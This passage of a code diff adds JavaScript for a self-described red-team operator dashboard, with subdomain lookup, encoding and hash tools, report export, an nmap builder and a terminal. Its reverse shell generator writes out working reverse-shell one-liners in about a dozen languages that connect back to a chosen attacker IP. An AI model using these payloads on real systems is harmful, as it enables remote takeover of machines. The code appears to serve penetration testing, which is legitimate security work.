+      const names = entry.common_name.split('\n').concat((entry.name_value || '').split('\n'));
+      names.forEach(n => {
+        const name = n.trim().toLowerCase().replace(/^\*\./, '');
+        if (name && name.endsWith(domain) && !subdomains.has(name)) {
+          subdomains.set(name, { issuer: entry.issuer_name, notBefore: entry.not_before });
+        }
+      });
+    });
+
+    const sorted = [...subdomains.entries()].sort((a, b) => a[0].localeCompare(b[0]));
+    spinner.style.display = 'none';
+
+    if (sorted.length === 0) {
+      status.textContent = `No subdomains found for ${domain}.`;
+      tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:var(--text-dim);padding:20px">No subdomains found</td></tr>';
+      return;
+    }
+
+    status.textContent = `Found ${sorted.length} unique subdomains for ${domain}.`;
+    tbody.innerHTML = sorted.map(([name, info]) => `
+      <tr>
+        <td style="color:var(--neon2)">${escapeHtml(name)}</td>
+        <td style="color:var(--text-dim)">${escapeHtml(info.issuer || 'N/A')}</td>
+        <td>${info.notBefore || 'N/A'}</td>
+      </tr>
+    `).join('');
+  } catch (err) {
+    spinner.style.display = 'none';
+    status.textContent = `Error: ${err.message}`;
+    tbody.innerHTML = `<tr><td colspan="3" style="text-align:center;color:var(--red);padding:20px">Failed to query crt.sh. Try again later.</td></tr>`;
+  }
+}
+
+// ══════════════════════════════════════════════
+// REVERSE SHELL GENERATOR
+// ══════════════════════════════════════════════
+function generateRevShell() {
+  const lang = document.getElementById('revshell-lang').value;
+  const ip = document.getElementById('revshell-ip').value || '10.10.14.1';
+  const port = document.getElementById('revshell-port').value || '4444';
+
+  const shells = {
+    bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+    bash2: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
+    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
+    python3: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
+    php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+    perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
+    ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
+    nc: `nc -e /bin/sh ${ip} ${port}`,
+    ncmkfifo: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+    powershell: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+    java: `Runtime r = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done"}; Process p = r.exec(cmd);`,
+    xterm: `xterm -display ${ip}:1`,
+    socat: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
+    lua: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
+  };
+
+  document.getElementById('revshell-output').textContent = shells[lang] || 'Select a language';
+  document.getElementById('revshell-listener').textContent = `nc -lvnp ${port}`;
+}
+
+function copyRevShell(btn) {
+  const text = document.getElementById('revshell-output').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy Shell'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function copyListener(btn) {
+  const text = document.getElementById('revshell-listener').textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy Listener'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// ══════════════════════════════════════════════
+// ENCODING / DECODING
+// ══════════════════════════════════════════════
+let currentEncodingType = 'base64';
+
+function setEncodingType(type, btn) {
+  currentEncodingType = type;
+  document.querySelectorAll('#encoding-type-btns .btn-tool').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+}
+
+function doEncode() {
+  const input = document.getElementById('enc-input').value;
+  let output = '';
+  try {
+    switch (currentEncodingType) {
+      case 'base64': output = btoa(Array.from(new TextEncoder().encode(input)).map(b => String.fromCharCode(b)).join('')); break;
+      case 'url': output = encodeURIComponent(input); break;
+      case 'html': output = input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); break;
+      case 'hex': output = Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2,'0')).join(' '); break;
+      case 'rot13': output = input.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))); break;
+    }
+  } catch (e) { output = 'Error: ' + e.message; }
+  document.getElementById('enc-output').value = output;
+}
+
+function doDecode() {
+  const input = document.getElementById('enc-input').value;
+  let output = '';
+  try {
+    switch (currentEncodingType) {
+      case 'base64': { const bytes = atob(input); output = new TextDecoder().decode(new Uint8Array([...bytes].map(c => c.charCodeAt(0)))); break; }
+      case 'url': output = decodeURIComponent(input); break;
+      case 'html': {
+        const el = document.createElement('textarea');
+        el.innerHTML = input;
+        output = el.value;
+        break;
+      }
+      case 'hex': output = new TextDecoder().decode(new Uint8Array(input.trim().split(/\s+/).map(h => parseInt(h, 16)))); break;
+      case 'rot13': output = input.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))); break;
+    }
+  } catch (e) { output = 'Error: Invalid input for decoding. ' + e.message; }
+  document.getElementById('enc-output').value = output;
+}
+
+function copyEncOutput(btn) {
+  const text = document.getElementById('enc-output').value;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy Output'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+function swapEncFields() {
+  const inp = document.getElementById('enc-input');
+  const out = document.getElementById('enc-output');
+  const tmp = inp.value;
+  inp.value = out.value;
+  out.value = tmp;
+}
+
+// ══════════════════════════════════════════════
+// HASH IDENTIFIER
+// ══════════════════════════════════════════════
+function identifyHash() {
+  const hash = document.getElementById('hash-input').value.trim();
+  const container = document.getElementById('hash-results');
+  if (!hash) {
+    container.innerHTML = '<div style="color:var(--text-dim);padding:12px;text-align:center;font-family:Share Tech Mono,monospace;font-size:12px">Enter a hash above to identify its type</div>';
+    return;
+  }
+
+  const len = hash.length;
+  const isHex = /^[a-fA-F0-9]+$/.test(hash);
+  const isBase64 = /^[A-Za-z0-9+/=]+$/.test(hash) && hash.length % 4 === 0;
+  const matches = [];
+
+  if (isHex) {
+    if (len === 32) matches.push('MD5', 'NTLM', 'MD4');
+    if (len === 40) matches.push('SHA-1', 'RIPEMD-160');
+    if (len === 56) matches.push('SHA-224', 'SHA3-224');
+    if (len === 64) matches.push('SHA-256', 'SHA3-256', 'Keccak-256');
+    if (len === 96) matches.push('SHA-384', 'SHA3-384');
+    if (len === 128) matches.push('SHA-512', 'SHA3-512', 'Whirlpool');
+    if (len === 16) matches.push('MySQL 3.x (short)', 'CRC-64');
+    if (len === 8) matches.push('CRC-32', 'Adler-32');
+  }
+
+  if (/^\$2[aby]?\$/.test(hash)) matches.push('bcrypt');
+  if (/^\$6\$/.test(hash)) matches.push('SHA-512 crypt (Unix)');
+  if (/^\$5\$/.test(hash)) matches.push('SHA-256 crypt (Unix)');
+  if (/^\$1\$/.test(hash)) matches.push('MD5 crypt (Unix)');
+  if (/^\$apr1\$/.test(hash)) matches.push('Apache APR1 MD5');
+  if (/^\$argon2/.test(hash)) matches.push('Argon2');
+  if (/^[a-fA-F0-9]{32}:[a-fA-F0-9]+$/.test(hash)) matches.push('MD5 with salt');
+  if (/^\{SHA\}/.test(hash)) matches.push('LDAP SHA');
+  if (/^\{SSHA\}/.test(hash)) matches.push('LDAP SSHA');
+  if (isBase64 && len === 44) matches.push('SHA-256 (Base64)');
+  if (isBase64 && len === 88) matches.push('SHA-512 (Base64)');
+  if (isBase64 && len === 24) matches.push('MD5 (Base64)');
+
+  if (matches.length === 0) {
+    matches.push('Unknown hash type');
+  }
+
+  container.innerHTML = `
+    <div class="hash-result">
+      <div class="info-label" style="margin-bottom:8px">Input Analysis</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text);margin-bottom:12px">
+        Length: <span style="color:var(--neon)">${len}</span> characters |
+        Hex: <span style="color:var(--neon)">${isHex ? 'Yes' : 'No'}</span> |
+        Base64: <span style="color:var(--neon)">${isBase64 ? 'Possible' : 'No'}</span>
+      </div>
+      <div class="info-label" style="margin-bottom:8px">Possible Hash Types</div>
+      <div>${matches.map(m => `<span class="hash-type">${m}</span>`).join('')}</div>
+    </div>
+  `;
+}
+
+// ══════════════════════════════════════════════
+// OPERATION NOTES
+// ══════════════════════════════════════════════
+function loadNotes() {
+  const saved = JSON.parse(localStorage.getItem('rt-op-notes') || 'null');
+  if (saved) {
+    document.getElementById('notes-textarea').value = saved.content || '';
+    document.getElementById('notes-meta').textContent = `Last saved: ${saved.timestamp || 'Unknown'}`;
+  }
+}
+
+function saveNotes() {
+  const content = document.getElementById('notes-textarea').value;
+  const timestamp = new Date().toISOString();
+  localStorage.setItem('rt-op-notes', JSON.stringify({ content, timestamp }));
+  document.getElementById('notes-meta').textContent = `Saved at: ${timestamp}`;
+}
+
+function exportNotes() {
+  const content = document.getElementById('notes-textarea').value;
+  if (!content) return;
+  const blob = new Blob([`RedTeam Operator Notes\nExported: ${new Date().toISOString()}\n${'='.repeat(50)}\n\n${content}`], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `op-notes-${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+function clearNotes() {
+  if (confirm('Clear all operation notes?')) {
+    document.getElementById('notes-textarea').value = '';
+    localStorage.removeItem('rt-op-notes');
+    document.getElementById('notes-meta').textContent = 'No saved notes';
+  }
+}
+
+// ══════════════════════════════════════════════
+// EXPORT REPORT
+// ══════════════════════════════════════════════
+function exportReport() {
+  const intel = gatheredIntel;
+  const lines = [];
+  lines.push('='.repeat(60));
+  lines.push('  REDTEAM OPERATOR DASHBOARD - INTELLIGENCE REPORT');
+  lines.push('='.repeat(60));
+  lines.push(`Generated: ${new Date().toISOString()}`);
+  lines.push('');
+
+  if (intel.parsed) {
+    const p = intel.parsed;
+    const r = intel.result || {};
+    lines.push(`Target: ${p.host}`);
+    lines.push(`Type: ${p.isIP ? 'IP Address' : 'Domain'}`);
+    lines.push('');
+
+    lines.push('--- DNS RECORDS ---');
+    Object.keys(r.dns || {}).forEach(type => {
+      const records = (r.dns[type] || []).map(rec => rec.data).join(', ');
+      lines.push(`  ${type}: ${records || 'None'}`);
+    });
+    lines.push('');
+
+    if (r.geo) {
+      lines.push('--- GEOLOCATION ---');
+      lines.push(`  Location: ${r.geo.city}, ${r.geo.region} ${r.geo.country_name}`);
+      lines.push(`  ISP/Org: ${r.geo.org || 'N/A'}`);
+      lines.push(`  ASN: ${r.geo.asn || 'N/A'}`);
+      lines.push('');
+    }
+
+    if (r.probe) {
+      lines.push('--- HTTP PROBE ---');
+      lines.push(`  Status: ${r.probe.status} ${r.probe.statusText}`);
+      if (r.headers) {
+        Object.keys(r.headers).forEach(h => {
+          lines.push(`  ${h}: ${r.headers[h]}`);
+        });
+      }
+      lines.push('');
+    }
+
+    if (r.ssl && r.ssl.length > 0) {
+      lines.push('--- SSL/TLS (crt.sh) ---');
+      r.ssl.slice(0,3).forEach(cert => {
+        lines.push(`  CN: ${cert.common_name} | Issuer: ${cert.issuer_name} | Expires: ${cert.not_after}`);
+      });
+      lines.push('');
+    }
+  } else {
+    lines.push('No analysis has been run yet. Run Target Analysis first.');
+    lines.push('');
+  }
+
+  const notes = document.getElementById('notes-textarea')?.value;
+  if (notes) {
+    lines.push('--- OPERATION NOTES ---');
+    lines.push(notes);
+    lines.push('');
+  }
+
+  // Include API service results in report
+  const apiSections = [
+    { id: 'shodan-results', label: 'SHODAN INTELLIGENCE' },
+    { id: 'greynoise-results', label: 'GREYNOISE INTELLIGENCE' },
+    { id: 'vuldb-results', label: 'VULDB VULNERABILITIES' },
+    { id: 'fullhunt-results', label: 'FULLHUNT ATTACK SURFACE' },
+    { id: 'zap-alerts-results', label: 'ZAP SECURITY ALERTS' },
+  ];
+  apiSections.forEach(section => {
+    const el = document.getElementById(section.id);
+    if (el && el.dataset.hasResults === 'true') {
+      const text = el.innerText.trim();
+      if (text) {
+        lines.push('--- ' + section.label + ' ---');
+        lines.push(text);
+        lines.push('');
+      }
+    }
+  });
+
+  lines.push('='.repeat(60));
+  lines.push('  END OF REPORT');
+  lines.push('='.repeat(60));
+
+  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `redteam-report-${new Date().toISOString().replace(/[:.]/g,'-')}.txt`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+// ══════════════════════════════════════════════
+// LIFECYCLE RENDER
+// ══════════════════════════════════════════════
+function renderLifecycle() {
+  const panel = document.getElementById('lifecycle-panel');
+  panel.innerHTML = LIFECYCLE_PHASES.map(p => `
+    <div style="border-bottom:1px solid var(--border)">
+      <div class="collapsible-header" onclick="toggleCollapse(this)">
+        <div class="collapsible-title">
+          <span class="phase-num">${p.num}</span>
+          ${p.icon} ${p.name}
+        </div>
+        <span class="collapsible-arrow">▼</span>
+      </div>
+      <div class="collapsible-body">
+        <div class="sub-label">Objectives</div>
+        <ul style="margin-left:16px;line-height:2;color:var(--text);font-size:13px">
+          ${p.steps.map(s => `<li>${s}</li>`).join('')}
+        </ul>
+        <div style="margin-top:12px"></div>
+        <div class="opsec-note"><strong>OPSEC:</strong> ${p.opsec}</div>
+        <div class="opsec-note"><strong>DETECTION RISK:</strong> ${p.detect}</div>
+        <div class="note-tip"><strong>LOGGING:</strong> ${p.logging}</div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function toggleCollapse(header) {
+  header.classList.toggle('open');
+  header.nextElementSibling.classList.toggle('open');
+}
+
+// ══════════════════════════════════════════════
+// CODE BLOCKS
+// ══════════════════════════════════════════════
+function renderCodeBlocks(data, containerId) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = data.map(section => `
+    <div style="margin-bottom:16px">
+      <div class="sub-label">${section.label}</div>
+      <div class="grid-2">
+        ${section.commands.map(cmd => `
+          <div class="code-block">
+            <div class="code-header">
+              <span class="code-label">${cmd.name}</span>
+              <button class="btn-copy" onclick="copyCode(this, '${escapeQ(cmd.cmd)}')">Copy</button>
+            </div>
+            <pre><code class="language-bash">${escapeHtml(cmd.cmd)}</code></pre>
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `).join('');
+  // Highlight
+  container.querySelectorAll('code').forEach(el => {
+    if (window.Prism) Prism.highlightElement(el);
+  });
+}
+
+function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function escapeQ(s) { return s.replace(/'/g, "\\'"); }
+
+function copyCode(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+
+// ══════════════════════════════════════════════
+// COMMAND BUILDER
+// ══════════════════════════════════════════════
+function buildCommand() {
+  const target = document.getElementById('b-target').value || 'target.com';
+  const type = document.getElementById('b-type').value;
+  const ports = document.getElementById('b-ports').value;
+  const script = document.getElementById('b-script').value;
+  const timing = document.getElementById('b-timing').value;
+  const output = document.getElementById('b-output').value;
+
+  let cmd = 'nmap';
+  if (type) cmd += ' ' + type;
+  if (ports) cmd += ' -p ' + ports;
+  if (script) cmd += ' ' + script;
+  if (timing) cmd += ' ' + timing;
+  if (output) cmd += ' ' + output;
+  cmd += ' ' + target;
+
+  document.getElementById('built-command').textContent = cmd;
+}
+
+function copyBuiltCommand() {
+  const cmd = document.getElementById('built-command').textContent;
+  navigator.clipboard.writeText(cmd).then(() => {
+    const btn = event.currentTarget;
+    btn.textContent = 'Copied!';
+    setTimeout(() => { btn.textContent = 'Copy Command'; }, 2000);
+  });
+}
+
+// ══════════════════════════════════════════════
+// CHECKLIST
+// ══════════════════════════════════════════════
+function renderChecklist() {
+  const container = document.getElementById('checklist-items');
+  const saved = JSON.parse(localStorage.getItem('rt-checklist') || '{}');
+  container.innerHTML = CHECKLIST_ITEMS.map(item => `
+    <div class="checklist-item ${saved[item.id] ? 'done' : ''}" id="ci-${item.id}">
+      <input type="checkbox" id="${item.id}" ${saved[item.id] ? 'checked' : ''} onchange="toggleCheck('${item.id}')">
+      <label for="${item.id}">${item.text}</label>
+      <span class="tag ${item.color}">${item.phase}</span>
+    </div>
+  `).join('');
+  updateProgress();
+}
+
+function toggleCheck(id) {
+  const saved = JSON.parse(localStorage.getItem('rt-checklist') || '{}');
+  saved[id] = document.getElementById(id).checked;
+  localStorage.setItem('rt-checklist', JSON.stringify(saved));
+  document.getElementById('ci-' + id).classList.toggle('done', saved[id]);
+  updateProgress();
+}
+
+function updateProgress() {
+  const total = CHECKLIST_ITEMS.length;
+  const done = CHECKLIST_ITEMS.filter(i => document.getElementById(i.id)?.checked).length;
+  const pct = Math.round(done / total * 100);
+  document.getElementById('checklist-pct').textContent = pct + '%';
+  document.getElementById('checklist-bar').style.width = pct + '%';
+}
+
+function resetChecklist() {
+  localStorage.removeItem('rt-checklist');
+  renderChecklist();
+}
+
+// ══════════════════════════════════════════════
+// SEARCH
+// ══════════════════════════════════════════════
+let searchTimeout;
+function handleSearch(q) {
+  clearTimeout(searchTimeout);
+  searchTimeout = setTimeout(() => {
+    if (!q) {
+      clearHighlights();
+      return;
+    }
+    highlightText(q);
+  }, 300);
+}
+
+function highlightText(q) {
+  clearHighlights();
+  const re = new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&') + ')', 'gi');
+  const walk = document.createTreeWalker(document.getElementById('content'), NodeFilter.SHOW_TEXT);
+  const nodes = [];
+  while (walk.nextNode()) nodes.push(walk.currentNode);
+  nodes.forEach(n => {
+    if (n.parentElement.tagName === 'SCRIPT' || n.parentElement.tagName === 'STYLE') return;
+    if (re.test(n.nodeValue)) {
+      const span = document.createElement('span');
+      span.innerHTML = n.nodeValue.replace(re, '<mark class="highlight">$1</mark>');
+      n.parentNode.replaceChild(span, n);
+    }
+  });
+}
+
+function clearHighlights() {
+  document.querySelectorAll('mark.highlight').forEach(m => {
+    m.parentNode.replaceChild(document.createTextNode(m.textContent), m);
+  });
+  // Normalize text nodes
+  document.getElementById('content').normalize();
+}
+
+// ══════════════════════════════════════════════
+// TERMINAL
+// ══════════════════════════════════════════════
+const TERMINAL_CMDS = {
+  help: () => `Available commands:\n  <span class="t-cmd">help</span>         — Show this help\n  <span class="t-cmd">scan</span>         — Run target analysis\n  <span class="t-cmd">nmap</span>         — Jump to Nmap library\n  <span class="t-cmd">enum</span>         — Jump to Enumeration\n  <span class="t-cmd">checklist</span>    — Jump to Checklist\n  <span class="t-cmd">lifecycle</span>    — Jump to Red Team Lifecycle\n  <span class="t-cmd">subdomains</span>   — Jump to Subdomain Discovery\n  <span class="t-cmd">revshell</span>     — Jump to Reverse Shell Generator\n  <span class="t-cmd">encode</span>       — Jump to Encoding Tools\n  <span class="t-cmd">hash</span>         — Jump to Hash Identifier\n  <span class="t-cmd">notes</span>        — Jump to Operation Notes\n  <span class="t-cmd">export</span>       — Export intelligence report\n  <span class="t-cmd">status</span>       — Show gathered intel summary\n  <span class="t-cmd">theme</span>        — Cycle themes\n  <span class="t-cmd">clear</span>        — Clear terminal\n  <span class="t-cmd">whoami</span>       — Identity check\n  <span class="t-cmd">date</span>         — Current timestamp`,
+  scan: () => { closeTerminal(); setTimeout(() => document.getElementById('target-input').focus(), 200); return '<span class="t-out">Redirecting to Target Analysis...</span>'; },
+  nmap: () => { closeTerminal(); setTimeout(() => scrollTo_('#nmap-section'), 200); return '<span class="t-out">Jumping to Nmap Library...</span>'; },
+  enum: () => { closeTerminal(); setTimeout(() => scrollTo_('#enum-section'), 200); return '<span class="t-out">Jumping to Enumeration...</span>'; },
+  checklist: () => { closeTerminal(); setTimeout(() => scrollTo_('#checklist-section'), 200); return '<span class="t-out">Jumping to Checklist...</span>'; },
+  lifecycle: () => { closeTerminal(); setTimeout(() => scrollTo_('#lifecycle-section'), 200); return '<span class="t-out">Jumping to Lifecycle...</span>'; },
+  subdomains: () => { closeTerminal(); setTimeout(() => scrollTo_('#subdomain-section'), 200); return '<span class="t-out">Jumping to Subdomain Discovery...</span>'; },
+  revshell: () => { closeTerminal(); setTimeout(() => scrollTo_('#revshell-section'), 200); return '<span class="t-out">Jumping to Reverse Shell Generator...</span>'; },
+  encode: () => { closeTerminal(); setTimeout(() => scrollTo_('#encoding-section'), 200); return '<span class="t-out">Jumping to Encoding Tools...</span>'; },
+  hash: () => { closeTerminal(); setTimeout(() => scrollTo_('#hash-section'), 200); return '<span class="t-out">Jumping to Hash Identifier...</span>'; },
+  notes: () => { closeTerminal(); setTimeout(() => scrollTo_('#notes-section'), 200); return '<span class="t-out">Jumping to Operation Notes...</span>'; },
+  export: () => { exportReport(); return '<span class="t-out">Exporting intelligence report...</span>'; },
+  status: () => {
+    const i = gatheredIntel;
+    if (!i.parsed) return '<span class="t-out">No intel gathered yet. Run a scan first.</span>';
+    const r = i.result || {};
+    const aRecs = (r.dns?.['A'] || []).length;
+    const ports = r.shodan?.ports?.length || 0;
+    return '<span class="t-out">Target: ' + i.parsed.host + '\n  DNS A records: ' + aRecs + '\n  RDAP: ' + (r.rdap ? 'Yes' : 'No') + '\n  SSL certs: ' + (r.ssl?.length || 0) + '\n  Geolocation: ' + (r.geo ? r.geo.city + ', ' + r.geo.country_name : 'N/A') + '\n  Last scan: ' + (i.timestamp || 'N/A') + '</span>';
+  },
+  theme: () => {
+    const themes = ['', 'cyberpunk', 'stealth'];
+    const current = document.documentElement.getAttribute('data-theme') || '';
+    const idx = (themes.indexOf(current) + 1) % themes.length;
+    setTheme(themes[idx], document.querySelectorAll('.theme-btn')[idx]);
+    return '<span class="t-out">Theme changed to: ' + (themes[idx] || 'matrix') + '</span>';
+  },
+  whoami: () => '<span class="t-out">operator | clearance: ALPHA | status: ACTIVE</span>',
+  date: () => `<span class="t-out">${new Date().toString()}</span>`,
+  clear: () => '__clear__',
+};
+
+const termHistory = [];
+let termHistIdx = -1;
+
+function openTerminal() {
+  document.getElementById('terminal-modal').classList.add('open');
+  document.getElementById('terminal-input').focus();
+  if (document.getElementById('terminal-output').children.length === 0) {
+    appendTerminal('<span class="t-out">RedTeam Operator Terminal v2.0</span>\n<span class="t-out">Type \'help\' for available commands.</span>');
+  }
+}
+
+function closeTerminal() {
+  document.getElementById('terminal-modal').classList.remove('open');
+}
+
+function appendTerminal(html) {
+  const out = document.getElementById('terminal-output');
+  const div = document.createElement('div');
+  div.innerHTML = html;
+  out.appendChild(div);
+  out.scrollTop = out.scrollHeight;
+}
+
+function handleTerminalInput(e) {
+  const inp = document.getElementById('terminal-input');
+  if (e.key === 'ArrowUp') {
+    if (termHistIdx < termHistory.length - 1) { termHistIdx++; inp.value = termHistory[termHistIdx]; }
+    e.preventDefault(); return;
+  }
+  if (e.key === 'ArrowDown') {
+    if (termHistIdx > 0) { termHistIdx--; inp.value = termHistory[termHistIdx]; }
+    else { termHistIdx = -1; inp.value = ''; }
+    e.preventDefault(); return;
+  }
+  if (e.key !== 'Enter') return;
+  const cmd = inp.value.trim().toLowerCase();
+  inp.value = '';
+  termHistIdx = -1;
+  if (!cmd) return;
+  termHistory.unshift(cmd);
+  appendTerminal(`<span class="t-cmd">operator@redteam:~$ ${escapeHtml(cmd)}</span>`);
+  const fn = TERMINAL_CMDS[cmd];
+  if (fn) {
+    const out = fn();
+    if (out === '__clear__') {
+      document.getElementById('terminal-output').innerHTML = '';
+    } else if (out) {
+      appendTerminal(out);
+    }
+  } else {
+    appendTerminal(`<span class="t-err">Command not found: ${escapeHtml(cmd)}. Type 'help' for commands.</span>`);
+  }
+}
+
+// Click outside terminal to close
+document.getElementById('terminal-modal').addEventListener('click', function(e) {
+  if (e.target === this) closeTerminal();
+});
+
+// ══════════════════════════════════════════════
+// API KEY MANAGEMENT
+// ══════════════════════════════════════════════
+function isValidIPv4(ip) {
+  const parts = ip.split('.');
+  return parts.length === 4 && parts.every(p => { const n = Number(p); return /^\d{1,3}$/.test(p) && n >= 0 && n <= 255; });
+}
+
+async function resolveToIP(query) {
+  if (isValidIPv4(query)) return query;
+  const dnsResp = await fetch('https://dns.google/resolve?name=' + encodeURIComponent(query) + '&type=A');
+  if (dnsResp.ok) {
+    const dnsData = await dnsResp.json();
+    if (dnsData.Answer && dnsData.Answer.length > 0) return dnsData.Answer[0].data;
+  }
+  throw new Error('Could not resolve domain to IP');
+}
+
+function showApiLoading(container, msg) {
+  container.dataset.hasResults = 'false';
+  container.innerHTML = '<div style="color:var(--neon);padding:20px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">' + escapeHtml(msg) + '</div>';
+}
+
+function showApiError(container, msg) {
+  container.dataset.hasResults = 'false';
+  container.innerHTML = '<div style="color:var(--red);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">' + escapeHtml(msg) + '</div>';
+}
+
+function showApiWarning(container, msg) {
+  container.dataset.hasResults = 'false';
+  container.innerHTML = '<div style="color:var(--yellow);padding:16px;text-align:center;font-family:\'Share Tech Mono\',monospace;font-size:12px">' + escapeHtml(msg) + '</div>';
+}
+
+function setApiResults(container, html) {
+  container.dataset.hasResults = 'true';
+  container.innerHTML = html;
+}
+function getApiKey(service) {
+  return localStorage.getItem('rt-apikey-' + service) || '';
+}
+
+function saveApiKey(service, value) {
+  localStorage.setItem('rt-apikey-' + service, value.trim());
+  updateApiKeyStatus(service);
+}
+
+function updateApiKeyStatus(service) {
+  const key = getApiKey(service);
+  const el = document.getElementById('api-status-' + service);
+  if (!el) return;
+  if (key) {
+    el.className = 'api-status configured';
+    el.textContent = '● Configured';
+  } else {
+    el.className = 'api-status not-configured';
+    el.textContent = '● Not configured';
+  }
+}
+
+function loadApiKeyUI() {
+  const services = ['shodan', 'greynoise', 'vuldb', 'fullhunt', 'zap'];
+  services.forEach(s => {
+    const key = getApiKey(s);
+    const input = document.getElementById('api-key-' + s);
+    if (input && key) input.value = key;
+    updateApiKeyStatus(s);
+  });
+  const zapUrl = getApiKey('zap_url');
+  const zapUrlInput = document.getElementById('api-key-zap-url');
+  if (zapUrlInput && zapUrl) zapUrlInput.value = zapUrl;
+}
+
+async function loadApiKeysFromFile() {
+  try {
+    const resp = await fetch('api-keys.json');
+    if (!resp.ok) throw new Error('Could not load api-keys.json');
+    const keys = await resp.json();
+    if (keys.shodan) saveApiKey('shodan', keys.shodan);
+    if (keys.greynoise) saveApiKey('greynoise', keys.greynoise);
+    if (keys.vuldb) saveApiKey('vuldb', keys.vuldb);
+    if (keys.fullhunt) saveApiKey('fullhunt', keys.fullhunt);
+    if (keys.zap) {
+      if (keys.zap.apiKey) saveApiKey('zap', keys.zap.apiKey);
+      if (keys.zap.url) saveApiKey('zap_url', keys.zap.url);
+    }
+    loadApiKeyUI();
+    alert('API keys loaded from api-keys.json successfully.');
+  } catch (err) {
+    alert('Failed to load api-keys.json: ' + err.message);
+  }
+}
+
+function clearAllApiKeys() {
+  if (!confirm('Clear all stored API keys?')) return;
+  ['shodan', 'greynoise', 'vuldb', 'fullhunt', 'zap', 'zap_url'].forEach(s => {
+    localStorage.removeItem('rt-apikey-' + s);
+  });
+  document.querySelectorAll('.api-key-input').forEach(el => el.value = '');
+  loadApiKeyUI();
+}
+
+// ══════════════════════════════════════════════
+// SHODAN FULL API
+// ══════════════════════════════════════════════
+async function runShodanQuery() {
+  const query = document.getElementById('shodan-query').value.trim();
+  const mode = document.getElementById('shodan-mode').value;
+  const container = document.getElementById('shodan-results');
+  const statusEl = document.getElementById('shodan-api-status');
+
+  if (!query) {
+    showApiWarning(container, 'Please enter an IP address or search query.');
+    return;
+  }
+
+  const apiKey = getApiKey('shodan');
+  showApiLoading(container, 'Querying Shodan...');
+
+  if (!apiKey) {
+    statusEl.innerHTML = '<span style="color:var(--yellow)">No API key configured. Using free InternetDB fallback (limited data).</span>';
+    try {
